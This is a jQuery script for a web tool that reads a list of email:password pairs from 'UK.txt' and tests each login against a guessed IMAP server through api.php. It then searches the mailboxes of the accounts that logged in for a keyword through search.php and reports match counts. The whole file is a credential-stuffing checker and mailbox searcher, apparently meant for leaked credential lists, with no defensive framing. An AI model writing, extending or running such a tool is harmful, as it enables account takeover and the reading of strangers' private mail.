$(function() {
    console.log('file loading');

    var email_list = [];
    var valid_emails = [];
    var imap_servers;
    var data_loaded = false;

    function loadEmails() {
        $.get('UK.txt', function(res) {
            if (!res) return;

            var lines = res.split('\n');
            lines.forEach(line => {
                var infos = line.split(":");
                if (infos.length == 2) {
                    email_list.push({
                        username: $.trim(infos[0]),
                        password: $.trim(infos[1]),
                        status: "none"
                    });
                }
            });

            loadServers();
        }, 'text');
    }

    function loadServers() {
        $.get('imap_server.json', function(data) {
            imap_servers = data;
            data_loaded = true;
            showData();
        }, 'JSON');
    }

    function showData() {
        for (var i = 0; i < email_list.length; i++) {
            var email = email_list[i];
            $('#all-emails').append(`
                <div class="item" id="email_${i}">
                    <div class="row">
                        <div class="col-md-5">
                            <label>${email.username}</label>
                        </div>
                        <div class="col-md-5">
                            <label>${email.password}</label>
                        </div>
                        <div class="col-md-2" class="status">
                            <label class="status"></label>
                        </div>
                    </div>
                </div>
            `);
        }
    }

    function addValidEmail(index) {
        email_list[index].status = 'valid';
        $('#email_' + index + ' .status').html('<label class="text-success">Valid</label>');
    }

    function addInvalidEmail(index) {
        email_list[index].status = 'invalid';
        $('#email_' + index + ' .status').html('<label class="text-danger">Invalid</label>');
    }

    function clearValidEmails() {
        $('#valid-emails').html(`
            <div class="item">
                <div class="row">
                    <div class="col-md-6">
                        <label class="fw-bold">Email</label>
                    </div>
                    <div class="col-md-6">
                        <label class="fw-bold">Status</label>
                    </div>
                </div>
            </div>
        `)
    }

    function clearSearchEmails() {
        $('#valid-emails').html(`
            <div class="item">
                <div class="row">
                    <div class="col-md-5">
                        <label class="fw-bold">Email</label>
                    </div>
                    <div class="col-md-2">
                        <label class="fw-bold">Status</label>
                    </div>
                    <div class="col-md-5">
                        <label class="fw-bold">Matched Mail Count</label>
                    </div>
                </div>
            </div>
        `)
    }

    $('#btn_validate').click(() => {
        if (!data_loaded) {
            'You need to wait Email Data loaded';
            return;
        }

        if (email_list.length) {
            // clearValidEmails();
            $('#all-emails .status').html('');
            for (var i = 0; i < email_list.length; i++) {
                email_list[i].status = 'none';
            }
            validateEmail(0);
        }
    });

    function validateEmail(index) {
        var email = email_list[index];
        var imap_server = getImapServer(email.username);


        $.ajax({
            method: 'post',
            url: 'api.php',
            data: {
                imap_server: imap_server,
                username: email.username,
                password: email.password
            },
            success: function(data, textStatus) {
                try {
                    var res = JSON.parse(data);
                    if (res.success) {

                        addValidEmail(index);
                    } else {
                        addInvalidEmail(index);
                    }

                    validateNext(index)
                } catch (e) {
                    addInvalidEmail(index);
                    validateNext(index)
                }

            },
            error: function(xhr, textStatus, errorThrown) {
                addInvalidEmail(index);

                validateNext(index)
            }
        })


    }

    function getImapServer(email) {
        for (var key in imap_servers) {
            if (email.indexOf(key) > -1) {
                return imap_servers[key];
            }
        }

        var i1 = email.indexOf('@');
        var email_right = email.substr(i1 + 1);
        return 'imap.' + email_right;
    }

    function validateNext(index) {
        index++;
        if (index == email_list.length) {
            alert('validation finished');
            return;
        }
        validateEmail(index);
    }

    $('#btn_search').click(() => {
        var searchkey = $('#searchkey').val();
        if (!searchkey) {
            'You need to input search key';
            return;
        }

        if (email_list[0].status != 'none') {
            clearSearchEmails();
            searchEmail(0, searchkey);
        } else {
            alert("There isn't validated Emails to search");
            return;
        }
    });

    function searchEmail(index, searchKey) {
        var email = email_list[index];
        var imap_server = getImapServer(email.username);

        $.ajax({
            method: 'post',
            url: 'search.php',
            data: {
                imap_server: imap_server,
                username: email.username,
                password: email.password,
                searchKey: searchKey
            },
            success: function(data, textStatus) {
                try {
                    var res = JSON.parse(data);
                    if (res.success) {
                        addSearchYesEmail(index, res.count);
                    } else {
                        addSearchNoEmail(index);
                    }
                    searchNext(index, searchKey);
                } catch (e) {
                    addSearchNoEmail(index);
                    searchNext(index, searchKey);
                }

            },
            error: function(xhr, textStatus, errorThrown) {
                addSearchNoEmail(index);
                searchNext(index, searchKey);
            }
        })
    }

    function searchNext(index, searchKey) {
        index++;
        if (index == email_list.length) {
            alert('search finished');
            return;
        }
        if (email_list[index].status == 'none') {
            alert('search finished');
            return;
        }
        if (email_list[index].status == 'invalid') {
            searchNext(index, searchKey);
            return;
        } else if (email_list[index].status == 'valid') {
            searchEmail(index, searchKey);
            return;
        }

    }

    function addSearchYesEmail(index, count) {
        var email = email_list[index];
        $('#valid-emails').append(`
            <div class="item">
                <div class="row">
                    <div class="col-md-5">
                        <label>${email.username}</label>
                    </div>
                    <div class="col-md-2">
                        <label class="text-success">Yes</label>
                    </div>
                    <div class="col-md-5">
                        <label>${count}</label>
                    </div>
                </div>
            </div>
        `);
    }

    function addSearchNoEmail(index) {
        var email = email_list[index];
        $('#valid-emails').append(`
            <div class="item">
                <div class="row">
                    <div class="col-md-5">
                        <label>${email.username}</label>
                    </div>
                    <div class="col-md-2">
                        <label class="text-danger">No</label>
                    </div>
                    <div class="col-md-5">
                        <label></label>
                    </div>
                </div>
            </div>
        `);
    }


    loadEmails();
    console.log('load');
});